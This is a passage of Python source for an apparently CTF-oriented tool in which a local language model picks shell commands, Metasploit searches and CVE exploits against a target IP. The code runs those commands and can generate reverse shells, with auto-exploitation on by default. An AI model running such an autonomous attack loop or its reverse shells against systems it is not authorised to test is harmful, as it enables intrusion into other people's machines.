            json_path.write_text(self.to_json(), encoding="utf-8")
            paths.append(json_path)

        if format in ["csv", "both"]:
            csv_path = REPORTS_DIR / f"report_{target}_{timestamp}.csv"
            csv_path.write_text(self.to_csv(), encoding="utf-8")
            paths.append(csv_path)

        return paths


class InteractiveShell:
    def __init__(self, db: Database, session_id: int):
        self.db = db
        self.session_id = session_id
        self.running = True
        self.aborted = False
        self.shell_gen = ShellGenerator()

    def process_input(self, user_input: str) -> Optional[str]:
        cmd = user_input.strip().lower()

        if cmd == "!help":
            return self._help()
        elif cmd == "!history":
            return self._history()
        elif cmd.startswith("!repeat"):
            return self._repeat(user_input)
        elif cmd == "!status":
            return self._status()
        elif cmd == "!abort":
            self.running = False
            self.aborted = True
            return "Auditoria abortada."
        elif cmd == "!quit":
            self.running = False
            return "Saliendo..."
        elif cmd.startswith("!flag "):
            return self._add_flag(user_input)
        elif cmd.startswith("!cve "):
            return self._cve_info(user_input)
        elif cmd.startswith("!shell "):
            return self._generate_shell(user_input)
        elif cmd == "!shells":
            return self._list_shells()
        elif cmd == "!cves":
            return self._list_cves()
        elif cmd == "!exploit ":
            return self._search_exploit(user_input)
        elif cmd == "!report":
            return self._generate_report()
        elif cmd == "!ips":
            return self._ips()
        elif cmd == "!nuclei":
            return "Usa: nuclei <url> [--severity critical,high,medium]"
        elif cmd.startswith("!nuclei "):
            return self._run_nuclei(user_input)

        return None

    def _help(self) -> str:
        return """
Comandos de Pentesting:
  !help           - Mostrar ayuda
  !history        - Ver historial
  !repeat N       - Repetir comando N
  !status         - Estado actual
  !flag <texto>   - Registrar flag
  !cve <CVE-ID>   - Info de CVE
  !cves           - Listar CVEs detectados
  !shell <IP> [PORT] - Generar reverse shells
  !shells         - Listar tipos de shells
  !exploit <term> - Buscar exploits
  !nuclei <url>   - Scan con Nuclei
  !report         - Generar reporte
  !ips            - Listar IPs
  !abort          - Abortar
  !quit           - Salir
"""

    def _history(self) -> str:
        commands = self.db.get_commands(self.session_id)
        if not commands:
            return "Sin comandos aun."
        result = "Historial:\n"
        for i, cmd in enumerate(commands, 1):
            result += f"  {i}. [{cmd['vibe']}] {cmd['command'][:60]}...\n"
        return result

    def _repeat(self, user_input: str) -> Optional[str]:
        try:
            idx = int(user_input.split()[1]) - 1
            commands = self.db.get_commands(self.session_id)
            if 0 <= idx < len(commands):
                return commands[idx]["command"]
        except (IndexError, ValueError):
            return "Uso: !repeat N"
        return None

    def _status(self) -> str:
        session = self.db.get_session(self.session_id)
        if not session:
            return "Sesion no encontrada."
        cves = self.db.get_cves(self.session_id)
        return f"""
Estado:
  IP: {session["target_ip"]}
  Comandos: {session["commands"]}
  CVEs: {len(cves)}
  Flags: {len([f for f in (session.get("flags", "") or "").split() if "flag" in f.lower()])}
  Status: {session["status"]}
"""

    def _add_flag(self, user_input: str) -> str:
        flag = user_input[6:].strip()
        if not flag:
            return "Uso: !flag <texto>"
        session = self.db.get_session(self.session_id)
        flags = session.get("flags", "") + f"\n{flag}" if session.get("flags") else flag
        self.db.update_session(self.session_id, flags=flags)
        cprint(f"[+] Flag: {flag}", Colors.GREEN)
        return f"Flag registrada."

    def _cve_info(self, user_input: str) -> str:
        parts = user_input.split()
        if len(parts) < 2:
            return "Uso: !cve CVE-YYYY-XXXXX"
        cve_id = parts[1]
        details = CVEAnalyzer.get_cve_details(cve_id)
        return f"""
CVE: {details["id"]}
Severity: {details["severity"]}
CVSS: {details["cvss"]}
Description: {details["description"][:300]}
"""

    def _list_cves(self) -> str:
        cves = self.db.get_cves(self.session_id)
        if not cves:
            return "Sin CVEs detectados."
        result = "CVEs detectados:\n"
        for cve in cves:
            status = "EXPLOTADO" if cve["exploited"] else "No explotado"
            result += f"  - {cve['cve_id']} ({cve['severity']}) - {cve['service']} [{status}]\n"
        return result

    def _generate_shell(self, user_input: str) -> str:
        parts = user_input.split()
        if len(parts) < 2:
            return "Uso: !shell <IP> [PORT]"
        ip = parts[1]
        port = int(parts[2]) if len(parts) > 2 else 4444

        shells = self.shell_gen.generate_reverse_shells(ip, port)
        result = f"Reverse shells para {ip}:{port}:\n\n"
        for name, shell in shells.items():
            result += f"**{name.upper()}:**\n```bash\n{shell}\n```\n\n"
        return result

    def _list_shells(self) -> str:
        shells = self.shell_gen.generate_reverse_shells("LHOST", 4444)
        return "Tipos de shells disponibles:\n" + "\n".join(
            f"  - {name}" for name in shells.keys()
        )

    def _search_exploit(self, user_input: str) -> str:
        parts = user_input.split(maxsplit=1)
        if len(parts) < 2:
            return "Uso: !exploit <termino>"
        term = parts[1]
        return CVEAnalyzer.search_service_exploits(term)

    def _run_nuclei(self, user_input: str) -> str:
        parts = user_input.split(maxsplit=1)
        if len(parts) < 2:
            return "Uso: !nuclei <url> [--severity critical,high]"
        target = parts[1]
        return NucleiScanner.scan(target)

    def _generate_report(self) -> str:
        session = self.db.get_session(self.session_id)
        commands = self.db.get_commands(self.session_id)
        cves = self.db.get_cves(self.session_id)
        generator = ReportGenerator(session, commands, cves)
        paths = generator.save("all")
        return f"Reportes:\n" + "\n".join(f"  - {p}" for p in paths)

    def _ips(self) -> str:
        ips = self.db.get_all_ips()
        if not ips:
            return "No hay IPs."
        return "IPs:\n" + "\n".join(f"  - {ip}" for ip in ips)


plugin_manager: Optional = None


def load_prompts() -> dict:
    if PROMPTS_FILE.exists():
        with open(PROMPTS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"system": ""}


def sanitize_command(command: str) -> tuple[bool, str]:
    if not command or not command.strip():
        return False, "Comando vacio"
    cmd_lower = command.lower().strip()
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, cmd_lower, re.IGNORECASE):
            return False, f"Patron peligroso: {pattern}"
    for blocked in COMMAND_BLACKLIST:
        if blocked.lower() in cmd_lower:
            return False, f"Comando bloqueado: {blocked}"
    first_word = cmd_lower.split()[0] if cmd_lower.split() else ""
    if first_word not in COMMAND_ALLOWLIST:
        return False, f"Comando no permitido: {first_word}"
    return True, ""


def get_timeout_for_command(command: str) -> int:
    cmd_lower = command.lower()
    if "nmap" in cmd_lower:
        return TIMEOUT_NMAP
    if "nuclei" in cmd_lower:
        return TIMEOUT_NUCLEI
    if "sqlmap" in cmd_lower:
        return TIMEOUT_SQLMAP
    if "msfconsole" in cmd_lower:
        return TIMEOUT_MSF
    if any(x in cmd_lower for x in ["gobuster", "dirb", "ffuf", "nikto", "enum4linux"]):
        return TIMEOUT_ENUM
    return TIMEOUT_DEFAULT


def update_vibe(vibe_name: str, progress: str = "") -> None:
    status = f"{vibe_name} {progress}".strip()
    try:
        with open(VIBE_STATUS_FILE, "w", encoding="utf-8") as f:
            f.write(status)
    except Exception:
        pass


def spinner_task(stop_event: threading.Event) -> None:
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(
            f"\r{Colors.CYAN}[PENSANDO]{Colors.RESET} {chars[i % len(chars)]} "
        )
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write("\r" + " " * 25 + "\r")


def run_command(command: str, timeout: Optional[int] = None) -> tuple[str, int, float]:
    safe, error_msg = sanitize_command(command)
    if not safe:
        cprint(f"[!] Seguridad: {error_msg}", Colors.RED)
        return f"ERROR DE SEGURIDAD: {error_msg}", 1, 0.0

    if timeout is None:
        timeout = get_timeout_for_command(command)

    cprint(f"\n{Colors.MAGENTA}>> EJECUTANDO:{Colors.RESET} {command}", Colors.YELLOW)
    print("-" * 50)

    full_output = ""
    start_time = time.time()

    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True,
        )

        while True:
            elapsed = int(time.time() - start_time)
            update_vibe("EXEC", f"({elapsed}s)")

            if elapsed > timeout:
                process.kill()
                return f"ERROR: Timeout ({timeout}s)", 124, float(timeout)

            reads = [process.stdout.fileno()]
            ret = select.select(reads, [], [], 0.1)

            for fd in ret[0]:
                if fd == process.stdout.fileno():
                    line = process.stdout.readline()
                    if line:
                        print(f"[{elapsed}s] {line}", end="", flush=True)
                        full_output += line

            if process.poll() is not None:
                remaining = process.stdout.read()
                if remaining:
                    print(f"[{elapsed}s] {remaining}", end="", flush=True)
                    full_output += remaining
                break

        end_time = time.time()
        duration = end_time - start_time
        print("-" * 50)
        cprint(f"[OK] Finalizado en {int(duration)}s", Colors.GREEN)
        return (
            full_output if full_output else "Sin salida.",
            process.returncode,
            duration,
        )

    except Exception as e:
        return f"ERROR: {str(e)}", 1, time.time() - start_time


def extract_flags_and_cves(
    output: str, session_id: int, db: Database
) -> tuple[list, list]:
    flags = []
    cves = CVEAnalyzer.extract_cves(output)

    for pattern in FLAG_PATTERNS:
        found = re.findall(pattern, output, re.IGNORECASE)
        flags.extend(found)

    flags = list(set(flags))[:10]

    for cve in cves:
        db.log_cve(session_id, cve)

    return flags, cves


def get_ai_response(messages: list, retries: int = 3) -> str:
    payload = {"model": MODEL, "messages": messages, "stream": False, "format": "json"}
    stop_spinner = threading.Event()
    spinner_thread = threading.Thread(target=spinner_task, args=(stop_spinner,))
    spinner_thread.start()
    last_error = None

    for attempt in range(retries):
        try:
            response = requests.post(OLLAMA_URL, json=payload, timeout=300)
            stop_spinner.set()
            spinner_thread.join()
            response.raise_for_status()
            return response.json()["message"]["content"]
        except Exception as e:
            last_error = str(e)
            stop_spinner.set()
            spinner_thread.join()
            if attempt < retries - 1:
                time.sleep(2**attempt)
                stop_spinner = threading.Event()
                spinner_thread = threading.Thread(
                    target=spinner_task, args=(stop_spinner,)
                )
                spinner_thread.start()
    return f"ERROR OLLAMA: {last_error}"


def run_audit(target_ip: str, resume: bool = False) -> int:
    global plugin_manager

    db = Database()
    memory = AdaptiveMemory(db)

    if resume:
        existing = db.get_session_by_ip(target_ip)
        if existing:
            cprint(f"[+] Sesion previa (ID: {existing['id']})", Colors.GREEN)
            session_id = existing["id"]
        else:
            cprint("[!] Creando nueva sesion...", Colors.YELLOW)
            session_id = db.create_session(target_ip)
    else:
        session_id = db.create_session(target_ip)

    prompts_data = load_prompts()
    system_prompt = prompts_data.get("system", "")

    adaptive_context = memory.get_context_for_prompt()

    history = [
        {"role": "system", "content": system_prompt},
        {
            "role": "user",
            "content": f"""Objetivo: {target_ip}

{adaptive_context}

INSTRUCCIONES:
- NO repitas comandos que ya fallaron (el contexto dice NO FUNCIONO)
- USA comandos similares a los que funcionaron (el contexto dice SI FUNCIONO)
- Si el contexto dice FAIL para un patron, intenta otra estrategia
- Si el contexto dice OK para un patron, es buena idea

INICIA RECON AHORA.""",
        },
    ]

    shell = InteractiveShell(db, session_id)
    metrics = MetricsCollector(db, session_id)
    audit_start_time = time.time()

    cprint(f"\n{'=' * 60}", Colors.CYAN, bold=True)
    cprint(
        "   PENTEST-CORE v4.0 - AGENTE DE PENTESTING AUTONOMO", Colors.CYAN, bold=True
    )
    cprint(f"{'=' * 60}\n", Colors.CYAN, bold=True)
    cprint(f"[+] Sesion: {session_id} | Target: {target_ip}", Colors.GREEN)
    cprint(
        f"[i] Modo: {'AGRESIVO' if config.get('aggressive_mode') else 'NORMAL'}",
        Colors.YELLOW,
    )
    cprint("[i] Comandos: !help para ayuda\n", Colors.DIM)

    if adaptive_context:
        cprint(
            f"[*] Contexto adaptativo cargado:\n{adaptive_context[:300]}...",
            Colors.DIM,
        )
        print()

    Telemetry.log_audit_start(target_ip, session_id)

    try:
        while shell.running:
            prompts_data = load_prompts()
            if prompts_data.get("system"):
                history[0]["content"] = prompts_data["system"]

            raw_response = get_ai_response(history)

            try:
                decision = json.loads(raw_response)
            except Exception:
                cprint(f"\n[!] Error JSON: {raw_response[:200]}...", Colors.RED)
                history.append({"role": "user", "content": "ERROR: JSON invalido."})
                continue

            vibe = decision.get("vibe", "RECON")
            metrics.set_phase(vibe)

            thinking = decision.get("thinking", decision.get("pensamiento", ""))
            decision_text = decision.get("decision", decision.get("justificacion", ""))
            reasoning = decision.get("reasoning", "")
            expected = decision.get("expected", "")

            cprint(f"\n{Colors.CYAN}[THINKING]{Colors.RESET}", bold=True)
            cprint(f"{Colors.DIM}{thinking}{Colors.RESET}", Colors.DIM)
            cprint(f"\n{Colors.BOLD}[{vibe}]{Colors.RESET} {decision_text}", bold=True)
            if reasoning:
                cprint(f"{Colors.YELLOW}   → {reasoning}{Colors.RESET}", Colors.YELLOW)
            if expected:
                cprint(
                    f"{Colors.GREEN}   Expected: {expected}{Colors.RESET}", Colors.GREEN
                )

            update_vibe(vibe)
            accion = decision.get("action", decision.get("accion", ""))

            if accion == "FINALIZAR":
                cprint("\n[OK] Pentesting completado.", Colors.GREEN, bold=True)
                db.update_session(
                    session_id,
                    status="completed",
                    finished_at=datetime.now().isoformat(),
                )
                break

            if accion == "CVE_EXPLOIT":
                cve_id = decision.get("comando", decision.get("cve", ""))
                cprint(f"\n[>>] Explotando CVE: {cve_id}", Colors.MAGENTA, bold=True)
                exploits = CVEAnalyzer.search_exploits(cve_id)
                cprint(f"Exploits disponibles:\n{exploits}", Colors.YELLOW)

                if config.get("auto_exploit_cve") and "exploit" in exploits.lower():
                    history.append({"role": "assistant", "content": raw_response})
                    history.append(
                        {
                            "role": "user",
                            "content": f"Buscando exploits para {cve_id}:\n{exploits}",
                        }
                    )
                    db.mark_cve_exploited(cve_id, session_id)
                continue

            if accion == "MSF":
                service = decision.get("comando", "")
                cprint(f"\n[>>] Buscando modulo MSF para: {service}", Colors.MAGENTA)
                output, exit_code, duration = run_command(
                    f'msfconsole -q -x "search {service}; exit"', timeout=1200
                )
                history.append({"role": "assistant", "content": raw_response})
                history.append({"role": "user", "content": f"MSF Results:\n{output}"})
                db.log_command(
                    session_id,
                    f"msfcli {service}",
                    output,
                    "EXPLOIT",
                    int(duration),
                    exit_code,
                )
                metrics.log_command(exit_code == 0)

                flags, cves = extract_flags_and_cves(output, session_id, db)
                for flag in flags:
                    session = db.get_session(session_id)
                    if flag not in (session.get("flags") or ""):
                        db.update_session(
                            session_id, flags=(session.get("flags") or "") + f"\n{flag}"
                        )
                        cprint(f"\n[FLAG] {flag}", Colors.GREEN, bold=True)
                        metrics.log_flag()
                continue

            if accion in ["EJECUTAR", "SHELL"]:
                command = decision.get("comando", "")
                output, exit_code, duration = run_command(command)

                history.append({"role": "assistant", "content": raw_response})
                history.append({"role": "user", "content": f"RESULTADO:\n{output}"})

                db.log_command(
                    session_id, command, output, vibe, int(duration), exit_code
                )
                metrics.log_command(exit_code == 0)
                Telemetry.log_command(target_ip, command, duration, exit_code == 0)

                if (
                    exit_code == 0
                    and output
                    and "not found" not in output.lower()
                    and "error" not in output.lower()[:50]
                ):
                    memory.log_success(command, f"Exit: {exit_code}")
                else:
                    memory.log_failure(command, f"Exit: {exit_code} - {output[:100]}")

                flags, cves = extract_flags_and_cves(output, session_id, db)

                for cve in cves:
                    cprint(f"\n[!] CVE DETECTADO: {cve}", Colors.RED, bold=True)
                    metrics.log_cve()
                    memory.log_success(command, f"CVE encontrado: {cve}")
                    if config.get("auto_exploit_cve"):
                        exploits = CVEAnalyzer.search_exploits(cve)
                        if "exploit" in exploits.lower():
                            cprint(f"[+] Exploit disponible para {cve}!", Colors.GREEN)
                            history.append(
                                {
                                    "role": "user",
                                    "content": f"CVE {cve} detectado. Exploits:\n{exploits}",
                                }
                            )

                for flag in flags:
                    session = db.get_session(session_id)
                    if flag not in (session.get("flags") or ""):
                        db.update_session(
                            session_id, flags=(session.get("flags") or "") + f"\n{flag}"
                        )
                        cprint(f"\n[FLAG] {flag}", Colors.GREEN, bold=True)
                        metrics.log_flag()
                        memory.log_success(command, f"FLAG: {flag}")

                log_file = LOGS_DIR / "pentest.log"
                with open(log_file, "a", encoding="utf-8") as log:
                    log.write(
                        f"\n[{time.ctime()}] IP: {target_ip} | CMD: {command}\nOUT: {output[:500]}\n"
                    )

    except KeyboardInterrupt:
        cprint("\n\n[!] Interrupcion...", Colors.YELLOW)
        shell.running = False

    if shell.aborted:
        db.update_session(
            session_id, status="aborted", finished_at=datetime.now().isoformat()
        )

    audit_duration = time.time() - audit_start_time
    metrics.save_to_db()

    Telemetry.log_audit_end(
        target_ip,
        session_id,
        metrics._flag_count,
        metrics._cve_count,
        audit_duration,
        "completed" if not shell.aborted else "aborted",
    )

    cprint("\n[i] Generando reporte...", Colors.DIM)
    session = db.get_session(session_id)
    commands = db.get_commands(session_id)
    cves = db.get_cves(session_id)
    generator = ReportGenerator(session, commands, cves)
    paths = generator.save("all")
    for p in paths:
        cprint(f"    - {p}", Colors.GREEN)

    cprint(f"\n{'=' * 60}", Colors.CYAN)
    cprint(f"RESUMEN:", Colors.CYAN, bold=True)
    cprint(f"  Flags encontradas: {metrics._flag_count}", Colors.GREEN)
    cprint(f"  CVEs detectados: {metrics._cve_count}", Colors.YELLOW)
    cprint(f"  Comandos: {metrics._command_count}", Colors.DIM)
    cprint(f"  Duracion: {int(audit_duration)}s", Colors.DIM)
    cprint(f"{'=' * 60}\n", Colors.CYAN)

    cprint("[*] POST-MORTEM:\n", Colors.MAGENTA, bold=True)
    print(memory.get_postmortem())

    cprint("\n[i] Lecciones guardadas para futuras sesiones.", Colors.DIM)

    db.close()
    update_vibe("IDLE")
    return session_id


def cmd_list(args):
    db = Database()
    sessions = db.list_sessions(args.status)
    if not sessions:
        cprint("No hay sesiones.", Colors.YELLOW)
        return
    cprint(
        f"\n{'ID':<4} {'IP':<18} {'Estado':<12} {'CVEs':<6} {'Flags':<6} {'Comandos':<10}",
        Colors.CYAN,
        bold=True,
    )
    cprint("-" * 70, Colors.DIM)
    for s in sessions:
        status_color = (
            Colors.GREEN
            if s["status"] == "completed"
            else Colors.YELLOW
            if s["status"] == "running"
            else Colors.RED
        )
        cves = json.loads(s.get("cves", "[]")) if s.get("cves") else []
        flags_count = len(
            [f for f in (s.get("flags") or "").split() if "flag" in f.lower()]
        )
        cprint(f"{s['id']:<4} {s['target_ip']:<18} ", status_color, end="")
        cprint(
            f"{s['status']:<12} {len(cves):<6} {flags_count:<6} {s['commands']:<10}",
            status_color,
        )
    db.close()


def cmd_report(args):
    db = Database()
    if args.session_id:
        session = db.get_session(args.session_id)
    else:
        session = db.get_session_by_ip(args.ip) if args.ip else None
    if not session:
        cprint("[!] Sesion no encontrada.", Colors.RED)
        db.close()
        return
    commands = db.get_commands(session["id"])
    cves = db.get_cves(session["id"])
    generator = ReportGenerator(session, commands, cves)
    paths = generator.save(args.format)
    cprint("\n[OK] Reportes:", Colors.GREEN)
    for p in paths:
        print(f"    {p}")
    db.close()


def cmd_info(args):
    db = Database()
    session = db.get_session(args.session_id)
    if not session:
        cprint("[!] Sesion no encontrada.", Colors.RED)
        db.close()
        return
    commands = db.get_commands(session["id"])
    cves = db.get_cves(session["id"])
    cprint(f"\n=== Sesion {session['id']} ===", Colors.CYAN, bold=True)
    cprint(f"IP: {session['target_ip']}", Colors.YELLOW)
    cprint(f"Estado: {session['status']}", Colors.YELLOW)
    cprint(f"Comandos: {session['commands']}", Colors.DIM)
    cprint(f"CVEs: {len(cves)}", Colors.DIM)
    if session.get("flags"):
        cprint("\nFlags:", Colors.GREEN)
        print(session["flags"])
    if cves:
        cprint("\nCVEs:", Colors.RED)
        for cve in cves:
            print(f"  - {cve['cve_id']} ({cve['severity']})")
    db.close()


def cmd_diff(args):
    db = Database()
    s1 = db.get_session(args.s1)
    s2 = db.get_session(args.s2)

    if not s1 or not s2:
        cprint("[!] Sesion no encontrada", Colors.RED)
        db.close()
        return

    c1 = db.get_commands(s1["id"])
    c2 = db.get_commands(s2["id"])

    cmds1 = {c["command"] for c in c1}
    cmds2 = {c["command"] for c in c2}

    common = cmds1 & cmds2
    only1 = cmds1 - cmds2
    only2 = cmds2 - cmds1

    cprint(f"\n{'=' * 50}", Colors.CYAN, bold=True)
    cprint(f"COMPARACION DE SESIONES", Colors.CYAN, bold=True)
    cprint(f"{'=' * 50}", Colors.CYAN, bold=True)

    cprint(f"\nSesion {s1['id']}: {s1['target_ip']}", Colors.YELLOW)
    cprint(
        f"  Comandos: {len(c1)} | Flags: {len(s1.get('flags', '').split())} | Status: {s1['status']}"
    )

    cprint(f"\nSesion {s2['id']}: {s2['target_ip']}", Colors.YELLOW)
    cprint(
        f"  Comandos: {len(c2)} | Flags: {len(s2.get('flags', '').split())} | Status: {s2['status']}"
    )

    cprint(f"\nComandos en comun: {len(common)}", Colors.DIM)
    cprint(f"Solo en sesion {s1['id']}: {len(only1)}", Colors.DIM)
    cprint(f"Solo en sesion {s2['id']}: {len(only2)}", Colors.DIM)

    if only1:
        cprint(f"\n[Sesion {s1['id']}]:", Colors.GREEN)
        for cmd in list(only1)[:5]:
            print(f"  + {cmd[:60]}")

    if only2:
        cprint(f"\n[Sesion {s2['id']}]:", Colors.RED)
        for cmd in list(only2)[:5]:
            print(f"  + {cmd[:60]}")

    db.close()


def cmd_init(args):
    cprint("[*] Inicializando PENTEST-CORE...", Colors.CYAN)

    dirs = [CHECKPOINT_DIR, LOGS_DIR, PLUGINS_DIR, REPORTS_DIR]
    for d in dirs:
        d.mkdir(parents=True, exist_ok=True)
        cprint(f"    {d.name}/", Colors.DIM)

    if not CONFIG_FILE.exists():
        default_config = {
            "ollama_url": "http://localhost:11434/api/chat",
            "model": "qwen2.5-coder:7b",
            "auto_exploit_cve": True,
            "aggressive_mode": True,
            "parallel_jobs": 3,
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(default_config, f, indent=2)
        cprint(f"    {CONFIG_FILE}", Colors.DIM)

    cprint("\n[OK] Inicializacion completa", Colors.GREEN)
    cprint(f"    Config: {CONFIG_FILE}", Colors.DIM)
    cprint(f"    DB: {DB_FILE}", Colors.DIM)


def cmd_lessons(args):
    db = Database()
    cursor = db.conn.execute("""
        SELECT command_pattern, success, note, count, last_used 
        FROM lessons ORDER BY last_used DESC LIMIT 20
    """)
    rows = cursor.fetchall()
    db.close()

    if not rows:
        cprint("No hay lecciones guardadas.", Colors.YELLOW)
        return

    cprint(
        f"\n{'PATRON':<40} {'OK/FAIL':<6} {'COUNT':<6} {'ULTIMO USO'}",
        Colors.CYAN,
        bold=True,
    )
    cprint("-" * 80, Colors.DIM)
    for row in rows:
        status = Colors.GREEN + "OK" if row[1] else Colors.RED + "FAIL"
        cprint(f"{row[0]:<40} {status:<6} {row[3]:<6} {row[4][:19]}", status)

    cprint(f"\nTotal: {len(rows)} lecciones", Colors.DIM)


def cmd_clean(args):
    db = Database()
    if args.lessons:
        db.conn.execute("DELETE FROM lessons")
        cprint("[OK] Lecciones eliminadas", Colors.GREEN)
    if args.sessions:
        db.conn.execute("DELETE FROM commands")
        db.conn.execute("DELETE FROM sessions")
        db.conn.execute("DELETE FROM cves")
        cprint("[OK] Sesiones eliminadas", Colors.GREEN)
    if args.all:
        db.conn.execute("DELETE FROM lessons")
        db.conn.execute("DELETE FROM commands")
        db.conn.execute("DELETE FROM sessions")
        db.conn.execute("DELETE FROM cves")
        db.conn.execute("DELETE FROM metrics")
        Path(DB_FILE).unlink(missing_ok=True)
        cprint("[OK] Todo limpio (DB borrada)", Colors.GREEN)
    db.conn.commit()
    db.close()


def main():
    parser = argparse.ArgumentParser(
        prog="pentest-core",
        description="PENTEST-CORE v4.0 - Pentester Autonomo con IA",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  pentest-core run 10.10.10.123         Iniciar pentest
  pentest-core run 10.10.10.123 --resume  Reanudar sesion
  pentest-core list                       Ver sesiones
  pentest-core info 1                     Detalles de sesion
  pentest-core report 1                   Generar reporte
  pentest-core lessons                    Ver lecciones aprendidas
  pentest-core clean --all               Limpiar todo
  pentest-core init                       Inicializar proyecto
        """,
    )
    parser.add_argument("--no-color", action="store_true", help="Sin colores")

    sub = parser.add_subparsers(dest="cmd", help="Comandos")

    p_run = sub.add_parser("run", help="Iniciar pentest")
    p_run.add_argument("target", help="IP o URL objetivo")
    p_run.add_argument("--resume", action="store_true", help="Reanudar sesion previa")
    p_run.add_argument("--aggressive", action="store_true", help="Modo agresivo")

    p_list = sub.add_parser("list", help="Listar sesiones")
    p_list.add_argument("--status", choices=["running", "completed", "aborted"])

    p_info = sub.add_parser("info", help="Info de sesion")
    p_info.add_argument("session", type=int, help="ID de sesion")
    p_info.add_argument("-v", "--verbose", action="store_true")

    p_report = sub.add_parser("report", help="Generar reporte")
    p_report.add_argument("session", type=int, help="ID de sesion")
    p_report.add_argument(
        "--format", choices=["md", "html", "json", "csv", "all"], default="all"
    )

    p_diff = sub.add_parser("diff", help="Comparar sesiones")
    p_diff.add_argument("s1", type=int, help="Sesion 1")
    p_diff.add_argument("s2", type=int, help="Sesion 2")

    sub.add_parser("lessons", help="Ver lecciones aprendidas")

    p_clean = sub.add_parser("clean", help="Limpiar datos")
    p_clean.add_argument("--lessons", action="store_true", help="Solo lecciones")
    p_clean.add_argument("--sessions", action="store_true", help="Solo sesiones")
    p_clean.add_argument("--all", action="store_true", help="Todo")

    sub.add_parser("init", help="Inicializar proyecto")

    args = parser.parse_args()

    if args.no_color:
        Colors.disable()

    if not args.cmd:
        parser.print_help()
        return

    if args.cmd == "run":
        run_audit(args.target, resume=args.resume)
    elif args.cmd == "list":
        cmd_list(argparse.Namespace(status=args.status))
    elif args.cmd == "info":
        cmd_info(argparse.Namespace(session_id=args.session, verbose=args.verbose))
    elif args.cmd == "report":
        cmd_report(
            argparse.Namespace(session_id=args.session, ip=None, format=args.format)
        )
    elif args.cmd == "diff":
        cmd_diff(argparse.Namespace(session1=args.s1, session2=args.s2))
    elif args.cmd == "lessons":
        cmd_lessons(args)
    elif args.cmd == "clean":
        cmd_clean(args)
    elif args.cmd == "init":
        cmd_init(args)


if __name__ == "__main__":
    main()
